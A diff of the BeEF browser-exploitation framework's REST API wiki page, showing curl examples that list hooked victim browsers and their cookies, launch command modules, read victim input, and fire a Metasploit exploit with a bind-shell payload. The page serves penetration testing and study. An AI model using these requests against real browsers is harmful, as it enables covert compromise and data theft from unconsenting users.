@@ -1,45 +1,94 @@
 ## Introduction
-From version 0.4.3.3, BeEF exposes a RESTful API allowing scripting BeEF through HTTP/JSON requests.
+From version 0.4.3.3 onwards, BeEF exposes a RESTful API. This allows users to script BeEF through HTTP/JSON requests.
+
+#### Table of Contents
+
+- [Authentication](#authentication)
+- [Hooked Browsers](#hooked-browsers)
+- [Browser Details](#browser-details)
+- [Logs](#logs)
+- [Browser's Log](#browsers-log)
+- [List Command Modules](#list-command-modules)
+- [Information on a Specific Module](#information-on-a-specific-module)
+- [Launch Command Module on a Specific Browser](#launch-command-module-on-a-specific-browser)
+- [Return Information About the Specific Command Module Previously Executed](#return-information-about-the-specific-command-module-previously-executed)
+- [Send a Metasploit Module](#send-a-metasploit-module)
+- [Send a Module to Multiple Hooked Browsers](#send-a-module-to-multiple-hooked-browsers)
+- [Send Multiple Modules to a Single Hooked Browser](#send-multiple-modules-to-a-single-hooked-browser)
+- [List the DNS ruleset](#list-the-dns-ruleset)
+- [List a Specific DNS Rule](#list-a-specific-dns-rule)
+- [Add a New DNS Rule](#add-a-new-dns-rule)
+- [Remove an Existing DNS Rule](#remove-an-existing-dns-rule)
+- [Scripts](#scripts)
 
 ## Authentication
 
-In order to use the API, a _token_ parameter must always be added to requests, otherwise a 401 error (Not Authorized) is returned.
+A new pseudo-random token is generated each time BeEF starts, using `BeEF::Core::Crypto::api_token`. The token is added to the `BeEF::Configuration` object.
 
-The pseudo-random token is newly generated every time BeEF starts, using _BeEF::Core::Crypto::api_token_ 
-and is then added to the _BeEF::Configuration_ object. It can be retrieved at any time via ruby using `BeEF::Core::Configuration.instance.get('beef.api_token')`
+When BeEF starts the token is printed to the console. It should look something like:
 
-When BeEF starts, look at the console output for 
-`[16:02:47][*] RESTful API key: 320f3cf4da7bf0df7566a517c5db796e73a23f47
+`[16:02:47][*] RESTful API key: 320f3cf4da7bf0df7566a517c5db796e73a23f47`
 
-Alternatively, for example if you want to write automated scripts that use the RESTful API, you can issue a POST request to `/api/admin/login` using the BeEF credentials you will find in the main config.yaml file.
-An example with curl: 
+**NOTE:**
+* If you require access to the token and you are writing Ruby code somewhere in BeEF, it can be called using:
+```ruby
+BeEF::Core::Configuration.instance.get('beef.api_token')
 ```
-curl -H "Content-Type: application/json" \
-     -X POST -d '{"username":"beef", "password":"beef"}'\
-     http://127.0.0.1:3000/api/admin/login
 
+### Requesting the Authentication Token from the API
+### Handler 
+
+* **Endpoint** 
+  * `POST /api/admin/login`
+* **Description** 
+  * In order to use the API, a `token` parameter must always be added to requests, otherwise a 401 error (Not Authorized) 
+    is returned. This request provides that token in response.
+  * The credentials sent in the body of the request are the ones set in the main [`config.yaml`](https://github.com/beefproject/beef/wiki/Command-Module-Config) file.
+* **Request Components**
+  * N/A
+* **Query Parameters**
+  * N/A
+* **Request Content**
+  * **Body**
+    * `username` - your username set in [`beef/config.yaml`](https://github.com/beefproject/beef/wiki/Command-Module-Config)
+    * `password` - your password set in [`beef/config.yaml`](https://github.com/beefproject/beef/wiki/Command-Module-Config)
+
+
+### Example
+
+#### Request 
+```bash
+curl -H "Content-Type: application/json" -X POST -d '{"username":"beef", "password":"beef"}' http://127.0.0.1:3000/api/admin/login
+```
+
+#### Response
+```
 response: {"success":true,"token":"8dc651e5ee1cb06003878bb26bd0e72800caeea0"}
 ```
-
-In this way you can parse the JSON response grabbing the token, and use it for your next requests to BeEF.
 
 ## Hooked Browsers
 
 ### Handler 
 
-* **Handler** : /api/hooks
-* Description : The _hooks_ handler gives information about the hooked browsers, both online and offline.
-* No parameters
+* **Endpoint** 
+  * `GET /api/hooks?token={token}`
+* **Description** 
+  * Provides information (browser and OS version, cookies, enabled plugins, etc) about **all** hooked browsers (both 
+    online and offline).
+* **Request Components**
+  * N/A
+* **Query Parameters**
+  * `{token}` - your authentication token (see [Authentication](#authentication))
 
 ### Example
 
-**Request**: 
-```
+#### Request 
+```bash
 curl http://beefserver.com:3000/api/hooks?token=320f3cf4da7bf0df7566a517c5db796e73a23f47
 ```
 
-Response:
-```json
+#### Response
+```
 {
     "hooked-browsers": {
         "online": {
@@ -71,66 +120,76 @@ Response:
 
 ## Browser Details
 
-In order to retrieve relative hooked browser details (like enabled plugins and technologies, cookies, screen size and additional info), we must specify the unique session id that identified the browser in the BeEF framework. This information can be found from the previous _/api/hooks_ call: the _session_ key value.
-
 ### Handler
-* **Request** : GET /api/hooks/:session
-* Description : Gather informations on a hooked browser
-* Parameters : 
-  * :session : Session of the browser
+* **Endpoint**
+  * `GET /api/hooks/{session}?token={token}`
+* **Description**
+  * Provides information (browser and OS version, cookies, enabled plugins, etc) about a **specific** hooked browser.
+* **Request Components** 
+  * `{session}` - session ID of the hooked browser. This ID is the `session_key` value returned in the response to the [`/api/hooks`](#hooked-browsers) request.
+* **Query Parameters**
+  * `{token}` - your authentication token (see [Authentication](#authentication))
 
 ### Example
 
-**Request**:
+#### Request
 
-```
+```bash
 curl http://beefserver.com:3000/api/hooks/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk?token=320f3cf4da7bf0df7566a517c5db796e73a23f47
 ```
 
-**Response**:
+#### Response
 
-```json
-{ "BrowserName" : "O",
-  "BrowserPlugins" : "Shockwave Flash\nJava Applet Plug-in\nQuickTime Plug-in 7.7.1\nSharePoint Browser Plug-in\nSilverlight Plug-In\nWebEx64 General Plugin Container",
-  "BrowserReportedName" : "Opera/9.80 (Macintosh; Intel Mac OS X 10.7.3; U; en) Presto/2.10.229 Version/11.62",
-  "BrowserType" : "{"O11":true,"O":true}",
-  "BrowserVersion" : "11",
-  "Cookies" : "BEEFHOOK=nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk",
-  "HasActiveX" : "No",
-  "HasFlash" : "Yes",
-  "HasGoogleGears" : "No",
-  "HasWebSocket" : "No",
-  "HostName" : "127.0.0.1",
-  "JavaEnabled" : "Yes",
-  "OsName" : "Macintosh",
-  "PageReferrer" : "No Referrer",
-  "PageTitle" : "BeEF Basic Demo",
-  "PageURI" : "http://127.0.0.1:3000/demos/basic.html",
-  "ScreenParams" : "{"width"=>1680, "height"=>1050, "colordepth"=>32}",
-  "SystemPlatform" : "MacIntel",
-  "VBScriptEnabled" : "No",
-  "WindowSize" : "{"width"=>1000, "height"=>729}",
-  "hasPersistentCookies" : "Yes",
-  "hasSessionCookies" : "Yes"
+```
+{ 
+  "BrowserName": "O",
+  "BrowserPlugins": "Shockwave Flash\nJava Applet Plug-in\nQuickTime Plug-in 7.7.1\nSharePoint Browser Plug-in\nSilverlight Plug-In\nWebEx64 General Plugin Container",
+  "BrowserReportedName": "Opera/9.80 (Macintosh; Intel Mac OS X 10.7.3; U; en) Presto/2.10.229 Version/11.62",
+  "BrowserType": "{"O11":true,"O":true}",
+  "BrowserVersion": "11",
+  "Cookies": "BEEFHOOK=nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk",
+  "HasActiveX": "No",
+  "HasFlash": "Yes",
+  "HasGoogleGears": "No",
+  "HasWebSocket": "No",
+  "HostName": "127.0.0.1",
+  "JavaEnabled": "Yes",
+  "OsName": "Macintosh",
+  "PageReferrer": "No Referrer",
+  "PageTitle": "BeEF Basic Demo",
+  "PageURI": "http://127.0.0.1:3000/demos/basic.html",
+  "ScreenParams": "{"width"=>1680, "height"=>1050, "colordepth"=>32}",
+  "SystemPlatform": "MacIntel",
+  "VBScriptEnabled": "No",
+  "WindowSize": "{"width"=>1000, "height"=>729}",
+  "hasPersistentCookies": "Yes",
+  "hasSessionCookies": "Yes"
 }
 ```
 
 ## Logs
 
 ### Handler
-* **URL** :  /api/logs
-* Description : The _logs_ handler gives information about hooked browser logs, both global and relative ones.
-* No parameters
+
+* **Endpoint**
+  * GET `/api/logs?token={token}`
+* **Description**
+  * The `logs` handler gives information about **all** hooked browser's logs, both global and relative.
+* **Request Components**
+  * N/A  
+* **Query Parameters**
+  * `{token}` - your authentication token (see [Authentication](#authentication))
 
 ### Example
 
-**Request** :
+#### Request
+```bash
+curl http://beefserver.com:3000/api/logs?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`
 ```
-curl http://beefserver.com:3000/api/logs?token=320f3cf4da7bf0df7566a517c5db796e73a23f47
-```
-**Response (snip)**
 
-```json
+#### Response
+
+```
 {
     "logs_count": 8,
     "logs": [
@@ -152,25 +211,28 @@ curl http://beefserver.com:3000/api/logs?token=320f3cf4da7bf0df7566a517c5db796e7
 
 ## Browser's Log
 
-In order to retrieve relative hooked browser logs, so events that are logged for a specific browser, we must specify the unique session id that identified the browser in the BeEF framework. This information can be found from the previous _/api/hooks_ call: the _session_ key value.
-
 ### Handler 
-* **URL** : GET /api/logs/:session
-* Description : Logs on one browser
-* Parameters : 
-  * session : session of the user
+* **Endpoint**
+  * `GET /api/logs/{session}?token={token}`
+* **Description**
+  * The `logs` handler gives information about a **specified** hooked browser's logs.
+* **Request Components** : 
+  * `{session}` - session ID of the hooked browser. This ID is the `session_key` value returned in the response to the 
+    [`/api/hooks`](#hooked-browsers) request.
+* **Query Parameters**
+  * `{token}` - your authentication token (see [Authentication](#authentication)).
 
 ### Example
 
-**Request**
+#### Request
+
+```bash
+curl http://beefserver.com:3000/api/logs/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`
+```
+
+#### Response
 
 ```
-curl http://beefserver.com:3000/api/logs/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk?token=320f3cf4da7bf0df7566a517c5db796e73a23f47
-```
-
-**Response (snip)**
-
-```json
 {
     "logs_count": 13,
     "logs": [
@@ -204,21 +266,26 @@ curl http://beefserver.com:3000/api/logs/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwa
 ## List Command Modules
 
 ### Handler
-* **Handler** => /api/modules
-* Description : list available command modules
-* No parameters
+* **Endpoint**
+  * `GET /api/modules?token={token}`
+* **Description**
+  * List **all** available BeEF command modules.
+* **Request Components**
+  * N/A
+* **Query Parameters**
+  * `{token}` - your authentication token (see [Authentication](#authentication)).
 
 ### Example
 
-**Request** 
+#### Request 
+
+```bash
+curl http://beefserver.com:3000/api/modules?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`
+```
+
+#### Response
 
 ```
-curl http://beefserver.com:3000/api/modules?token=320f3cf4da7bf0df7566a517c5db796e73a23f47
-```
-
-**Response (snip)**
-
-```json
 {
     "0": {
         "id": 1,
@@ -243,24 +310,30 @@ curl http://beefserver.com:3000/api/modules?token=320f3cf4da7bf0df7566a517c5db79
 }
 ```
 
-## Informations on a specific module
+## Information on a Specific Module
 
 ### Handler
-* **URL** : GET /api/modules/:module_id
-* Description : 
-* Parameters :
-  * module_id : ID of the BeEF module
+* **Endpoint**
+  * `GET /api/modules/{module_id}?token={token}`
+* **Description**
+  * Get detailed information about a **specific** BeEF command module.
+* **Request Components** :
+  * `{module_id}` - ID of the BeEF module. See [List Command Modules](#list-command-modules).
+* **Query Parameters**
+  * `{token}` - your authentication token (see [Authentication](#authentication)).
 
 ### Example
-**Request**:
+
+
+#### Request
+
+```bash
+curl http://beefserver.com:3000/api/modules/71?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`
+```
+
+#### Response
 
 ```
-curl http://beefserver.com:3000/api/modules/71?token=320f3cf4da7bf0df7566a517c5db796e73a23f47
-```
-
-**Response**:
-
-```json
 {
     "name": "prompt_dialog",
     "description": "Sends a prompt dialog to the hooked browser.",
@@ -274,161 +347,206 @@ curl http://beefserver.com:3000/api/modules/71?token=320f3cf4da7bf0df7566a517c5d
     ]
 }
 ```
-## Launch a command on a specific browser
+## Launch Command Module on a Specific Browser
 
 ### Handler
 
-* **URL** : POST /api/modules/:session/:module_id
-* Description : launch the module given on the zombie browser given
-* Parameters :
-  * :session : session of the hooked browser
-  * :module_id : ID of the BeEF module
-  * + parameters needed for the module
+* **Endpoint**
+  * `POST /api/modules/{session}/{module_id}?token={token}`
+* **Description**
+  * Launch a **specific** BeEF command module against a **given** hooked browser.
+* **Request Components**
+  * `{session}` - session ID of the hooked browser. This ID is the `session_key` value returned in the response to the 
+    [`/api/hooks`](#hooked-browsers) request.
+  * `{module_id}` - ID of the BeEF module. See [List Command Modules](#list-command-modules).
+* **Query Parameters**
+  * `{token}` - your authentication token (see [Authentication](#authentication))
+* **Request Content**
+  * **Headers**
+    * Content-Type: `application/json; charset=UTF-8`
 
 ### Example
 
-NOTE: the request header must contain `Content-Type: application/json; charset=UTF-8` and the request body must be valid JSON. In the following example we send the _prompt-dialog_ command module: according to the previous _/api/modules/71_ call, we can specify the _question_ input with our custom value. 
+In the following example we send the `prompt-dialog` command module. Using our last example (our `/api/modules/71` call), we can see that we can specify the `question` input with a custom value. 
 
-**Request** :
+**NOTE:** 
+* The request header must contain `Content-Type: application/json; charset=UTF-8` and the request body must be valid JSON.
+
+#### Request
+
+```bash
+curl -H "Content-Type: application/json; charset=UTF-8" -d '{"question":"wtf?"}' -X POST http://beefserver.com:3000/api/modules/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk/71?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`
+```
+
+#### Response
 
 ```
-curl -H "Content-Type: application/json; charset=UTF-8" \
-     -d '{"question":"wtf?"}' -X POST \
-     http://beefserver.com:3000/api/modules/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk/71?token=320f3cf4da7bf0df7566a517c5db796e73a23f47
-```
-
-**Response** :
-
-```json
 {
     "success": "true",
     "command_id": "1"
 }
 ```
-## Return information about the specific command module previously executed
-
-Reusing the previous example, we want to know the command module execution results (or, what the victim entered to the prompt dialog). In this case the victim entered _don't know_ :D
+## Return Information About the Specific Command Module Previously Executed
 
 ### Handler
-* **URL** : GET /api/modules/:session/:mod_id/:cmd_id
-* **Description** : Returns information on the command previously launched
-* **Parameters** :
-  * :session : session of the hooked browser
-  * :mod_id : ID of the BeEF module
-  * cmd_id : id of the command launched
+* **Endpoint**
+  * `GET /api/modules/{session}/{module_id}/{cmd_id}?token={token}`
+* **Description**
+  * Returns information about a **specific** previously launched BeEF command module.
+* **Request Components**
+  * `{session}` - session ID of the hooked browser. This ID is the `session_key` value returned in the response to the 
+    [`/api/hooks`](#hooked-browsers) request.
+  * `{module_id}` - ID of the BeEF module. See [List Command Modules](#list-command-modules).
+  * `{cmd_id}` - ID of the command launched. See [Launch Command Module](#launch-command-module-on-a-specific-browser).
+* **Query Parameters**
+  * `{token}` - your authentication token (see [Authentication](#authentication))
 
 ### Example 
 
-**Request** :
+Again using our previous example, we would like to know results from the executed command module i.e. what the victim entered to the prompt dialog. In this case the victim entered `don't know` :D
+
+#### Request
+
+```bash
+curl http://beefserver.com:3000/api/modules/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk/71/1?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`
+```
+
+#### Response
 
 ```
-curl http://beefserver.com:3000/api/modules/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk/71/1?token=320f3cf4da7bf0df7566a517c5db796e73a23f47
-```
-
-**Response**:
-
-```json
 {
     "date": "1332260323",
     "data": "{"data":"answer=don't know"}"
 }
 ```
 
-## Send a Metasploit module
+## Send a Metasploit Module
 
 ### Handler
-* **URL** : POST /api/modules/:session/:module_id
-* **Description** : Launch a metasploit module on a given browser
-* **Parameters** :
-  * session : Session of the current browser
-  * module_id : ID of the BeEF module
-  * + Parameters needed to launch the module
+* **Endpoint**
+  * `POST /api/modules/{session}/{module_id}?token={token}`
+* **Description**
+  * Launch a **specific** Metasploit module against a **given** hooked browser
+* **Request Components** :
+  * `{session}` - session ID of the hooked browser. This ID is the `session_key` value returned in the response to the 
+    [`/api/hooks`](#hooked-browsers) request.
+  * `{module_id}` - ID of the BeEF module. See [List Command Modules](#list-command-modules).
+* **Query Parameters**
+  * `{token}` - your authentication token (see [Authentication](#authentication))
+* **Request Content**
+  * **Headers**
+    * Content-Type: `application/json; charset=UTF-8`
 
-### Example : 
+### Example
 
-NOTE: the request header must contain `Content-Type: application/json; charset=UTF-8` and the request body must be valid JSON. In the following example we send the _Adobe FlateDecode Stream Predictor 02 Integer Overflow_. Metasploit modules will be listed together with BeEF modules, marked with the _metasploit_ category.
+In the following example we send the `Adobe FlateDecode Stream Predictor 02 Integer Overflow`. Metasploit modules will be listed together with BeEF modules, marked with the `metasploit` category.
 
-**Request** :
+**NOTE:** 
+* The request header must contain `Content-Type: application/json; charset=UTF-8` and the request body must be valid JSON.
+
+#### Request
+
+```bash
+curl -H "Content-Type: application/json; charset=UTF-8" -d '{"SRVPORT":"3992", "URIPATH":"77345345345dg", "PAYLOAD":"generic/shell_bind_tcp"}' -X POST http://beefserver.com:3000/api/modules/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk/236?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`
+```
+
+#### Response
+
+**NOTE:** 
+* You cannot query BeEF or Metasploit with [Return Information About A Command Module Previously Executed](#return-information-about-the-specific-command-module-previously-executed) call to historically check the result of an executed Metasploit module.
+* This is why `"command_id":"not_available"` appears in the response of this request.
 
 ```
-curl -H "Content-Type: application/json; charset=UTF-8" \
-     -d '{"SRVPORT":"3992", "URIPATH":"77345345345dg", "PAYLOAD":"generic/shell_bind_tcp"}' \
-    -X POST http://beefserver.com:3000/api/modules/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk/236?token=320f3cf4da7bf0df7566a517c5db796e73a23f47
-```
-
-**Response**
-
-NOTE: in this case we cannot query BeEF nor Metasploit if module execution was successful or not.
-This is why there is "command_id":"not_available" in the response.
-
-```json
 {
     "success": "true",
     "command_id": "not_available"
 }
 ```
 
-## Send a module to multiple hooked browsers
+## Send a Module to Multiple Hooked Browsers
 
 ### Handler
-* **URL** : POST /api/modules/multi_browser
-* **Description** : Fire a new command module to multiple hooked browsers. Returns the command IDs of the launched module, or 0 if firing got issues.
-* **Parameters** :
-  * mod_id : module ID
-  * mod_params : parameters needed for the module
-  * hb_ids : IDs of the target hooked browsers
+* **Endpoint** 
+  * `POST /api/modules/multi_browser?token={token}`
+* **Description**
+  * Fire a BeEF command module to **multiple** hooked browsers. Returns the command IDs of the launched module, or 0 if there were errors.
+* **Request Components**
+  * N/A
+* **Query Parameters**
+  * `{token}` - your authentication token (see [Authentication](#authentication))
+* **Request Content**
+  * **Headers**
+    * Content-Type: `application/json; charset=UTF-8`
+  * **Body**
+    * `mod_id` - ID of the BeEF module. See [List Command Modules](#list-command-modules).
+    * `mod_params` - parameters needed for the module
+    * `hb_ids` - session ID of the hooked browser. This ID is the `session_key` value returned in the response to the [`/api/](#hooked-browsers) request.
 
-### Example : 
+### Example
+##### Sending an Alert Module w/ Custom Text to 2 Browsers
 
-NOTE: Alert module with custom text, 2 hooked browsers. 
+**NOTE:** 
+* The request header must contain `Content-Type: application/json; charset=UTF-8` and the request body must be valid JSON.
 
-**Request** :
+#### Request
+
+```bash
+curl -H "Content-Type: application/json; charset=UTF-8" -d '{"mod_id":110,"mod_params":{"text":"vadi?"},"hb_ids":[1,2]}' -X POST http://beefserver.com:3000/api/modules/multi?token=2316d82702b83a293e2d46a0886a003a6be0a633
+```
+
+#### Response
 
 ```
-curl -H "Content-Type: application/json; charset=UTF-8" \
-     -d '{"mod_id":110,"mod_params":{"text":"vadi?"},"hb_ids":[1,2]}' -X POST \
-     http://beefserver.com:3000/api/modules/multi?token=2316d82702b83a293e2d46a0886a003a6be0a633
-```
-
-**Response**
-
-```json
 {
-"1":16,
-"2":17
+    "1": 16,
+    "2": 17
 }
 ```
 
-## Send multiple modules to a single hooked browser
+## Send Multiple Modules to a Single Hooked Browser
 
 ### Handler
-* **URL** : POST /api/modules/multi_module
-* **Description** : Fire multiple command modules to a single hooked browser. Returns the command IDs of the launched modules, or 0 if firing got issues.
-* **Parameters** :
-  * hb : hooked browser session
-  * modules : an array containing all the modules to be launched, with the following two keys:
-     * mod_id : module ID
-     * mod_input : module custom input
-### Example : 
+* **Endpoint**
+  * `POST /api/modules/multi_module?token={token}`
+* **Description**
+  * Fire **multiple** command modules to a **single** hooked browser. Returns the command IDs of the launched modules, or 0 if there were errors.
+* **Request Components**
+  * N/A
+* **Query Parameters**
+  * `{token}` - your authentication token (see [Authentication](#authentication))
+* **Request Content**
+  * **Headers**
+    * Content-Type: `application/json; charset=UTF-8`
+  * **Body**
+    * `hb_id` - session ID of the hooked browser. This ID is the `session_key` value returned in the response to the 
+    [`/api/hooks`](#hooked-browsers) request.
+    * `modules` - an array containing all the modules to be launched, with the following two keys:
+    * `modules.mod_id` - ID of the BeEF module. See [List Command Modules](#list-command-modules).
+    * `modules.mod_input` - any ncessary module parameters.
 
-NOTE: Alert module with custom text, 2 hooked browsers. For modules that don't need parameters, just pass an empty JSON object like {}.
+### Example 
+##### Alert Module w/ Custom Text Using 2 Modules
 
-**Request** :
+**NOTE:** 
+* The request header must contain `Content-Type: application/json; charset=UTF-8` and the request body must be valid JSON.
+* For modules that don't need parameters, just pass an empty JSON object like {}.
+
+#### Request
+
+```bash
+curl -H "Content-Type: application/json; charset=UTF-8" -d '{"hb":"vkIwVV3ok5i5vH2f8sxlkoaKqAGKCbZXdWqE9vkHNFBhI8aBBHvtZAGRO2XqFZXxThBlmKlRiVwPeAzj","modules":[{"mod_id":99,"mod_input":[{"repeat":"10"},{"repeat_string":"ABCDE"}]},{"mod_id":116,"mod_input":[{"question":"hooked?"}]},{"mod_id":128,"mod_input":[]}]}' -X POST http://beefserver.com:3000/api/modules/multi_module?token=e640483ae9bca2eb904f003f27dd4bc83936eb92
+```
+
+#### Response
+
+**NOTE:**
+* Here that the Alert Dialog module execution had issues (i.e. it returns 0).
 
 ```
-curl -H "Content-Type: application/json; charset=UTF-8" \
-     -d '{"hb":"vkIwVV3ok5i5vH2f8sxlkoaKqAGKCbZXdWqE9vkHNFBhI8aBBHvtZAGRO2XqFZXxThBlmKlRiVwPeAzj","modules":[{"mod_id":99,"mod_input":[{"repeat":"10"},{"repeat_string":"ABCDE"}]},{"mod_id":116,"mod_input":[{"question":"hooked?"}]},{"mod_id":128,"mod_input":[]}]}' \
-     -X POST \
-     http://beefserver.com:3000/api/modules/multi_module?token=e640483ae9bca2eb904f003f27dd4bc83936eb92
-```
-
-**Response**
-NOTE: the following means the Alert Dialog module execution had issues (returning 0).
-```json
 {
-"99":7,
-"116":8,
-"128":0
+    "99": 7,
+    "116": 8,
+    "128": 0
 }
 ```
 
@@ -436,21 +554,26 @@ NOTE: the following means the Alert Dialog module execution had issues (returnin
 
 ### Handler
 
-* **URL** : GET /api/dns/ruleset
-* **Description** : Returns the current set of DNS rules.
-* **No parameters**
+* **Endpoint**
+  * `GET /api/dns/ruleset?token={token}`
+* **Description**
+  * Returns the current set of DNS rules.
+* **Request Components**
+  * N/A
+* **Query Parameters**
+  * `{token}` - your authentication token (see [Authentication](#authentication))
 
 ### Example
 
-**Request**
+#### Request
 
-```
+```bash
 curl http://beefserver.com:3000/api/dns/ruleset?token=320f3cf4da7bf0df7566a517c5db796e73a23f47
 ```
 
-**Response**
+#### Response
 
-```json
+```
 {
     "count": 5,
     "ruleset": [
@@ -500,26 +623,30 @@ curl http://beefserver.com:3000/api/dns/ruleset?token=320f3cf4da7bf0df7566a517c5
 }
 ```
 
-## List a specific DNS rule
+## List a Specific DNS Rule
 
 ### Handler
 
-* **URL** : GET /api/dns/rule/:id
-* **Description** : Returns an individual DNS rule given its unique id.
-* **Parameters** :
-  * :id : unique identifier associated with rule
+* **Endpoint**
+  * `GET /api/dns/rule/{id}?token={token}`
+* **Description** 
+  * Returns an individual DNS rule given its unique id.
+* **Request Components**
+  * `{id}` - unique identifier associated with a **specific** DNS rule
+* **Query Parameters**
+  * `{token}` - your authentication token (see [Authentication](#authentication))
 
 ### Example
 
-**Request**
+#### Request
 
-```
+```bash
 curl http://beefserver.com:3000/api/dns/rule/7e64183?token=320f3cf4da7bf0df7566a517c5db796e73a23f47
 ```
 
-**Response**
+#### Response
 
-```json
+```
 {
     "id": "7e64183",
     "pattern": "example.com",
@@ -531,54 +658,67 @@ curl http://beefserver.com:3000/api/dns/rule/7e64183?token=320f3cf4da7bf0df7566a
 }
 ```
 
-## Add a new DNS rule
+## Add a New DNS Rule
 
 ### Handler
 
-* **URL** : POST /api/dns/rule
-* **Description** : Adds a new DNS rule or "resource record". Does nothing if rule is already present.
-* **Parameters** :
-  * pattern : query pattern to recognize
-  * resource : resource record type (e.g. A, CNAME, NS, etc.)
-  * response : array containing response data
+* **Endpoint**
+  * `POST /api/dns/rule?token={token}`
+* **Description**
+  * Adds a new DNS rule or "resource record". Does nothing if rule is already present.
+* **Request Comonents**
+  * N/A
+* **Query Parameters**
+  * `{token}` - your authentication token (see [Authentication](#authentication))
+* **Request Content** 
+  * **Headers**
+    * Content-Type: `application/json; charset=UTF-8`
+  * **Body**
+    * `pattern` - the query pattern to recognize.
+    * `resource` - the resource record type (e.g. A, CNAME, NS, etc).
+    * `response` - an array containing the response data.
 
 ### Example
 
-**Request**
+#### Request
 
-```
+```bash
 curl -H "Content-Type: application/json; charset=UTF-8" -d '{"pattern": "example.com", "resource": "A", "response": [ "10.0.2.14" ]}' -X POST http://beefserver.com:3000/api/dns/rule?token=320f3cf4da7bf0df7566a517c5db796e73a23f47
 ```
 
-**Response**
+#### Response
 
-```json
+```
 {
     "success": true,
     "id": "01f458a"
 }
 ```
 
-## Remove an existing DNS rule
+## Remove an Existing DNS Rule
 
 ### Handler
 
-* **URL** : DELETE /api/dns/rule/:id
-* **Description** : Removes an individual DNS rule given its unique id.
-* **Parameters** :
-  * :id : unique identifier associated with rule
+* **Endpoint**
+  * `DELETE /api/dns/rule/{id}?token={token}`
+* **Description**
+  * Removes an individual DNS rule with a **specified** unique ID.
+* **Request Components** :
+  * `{id}` - unique ID associated with the targeted rule.
+* **Query Parameters**
+  * `{token}` - your authentication token (see [Authentication](#authentication))
 
 ### Example
 
-**Request**
+#### Request
 
-```
+```bash
 curl -X DELETE http://beefserver.com:3000/api/dns/rule/45ce397?token=320f3cf4da7bf0df7566a517c5db796e73a23f47
 ```
 
-**Response**
+#### Response
 
-```json
+```
 {
     "success": true
 }
@@ -587,7 +727,5 @@ curl -X DELETE http://beefserver.com:3000/api/dns/rule/45ce397?token=320f3cf4da7
 ## Scripts
 * [[Java-1.6.0u27 mass-pwner|Script:-Java-1.6.0u27-mass-pwner]]
 
-If you have realized any script that you would like to share with the community, please contact [Nbblr](https://github.com/Nbblrr)
-
 ***
-[[Previous|Persistence]] | [[Next|Autorun]]
+[[Persistence|Persistence]] | [[Autorun Rule Engine|Autorun Rule Engine]]
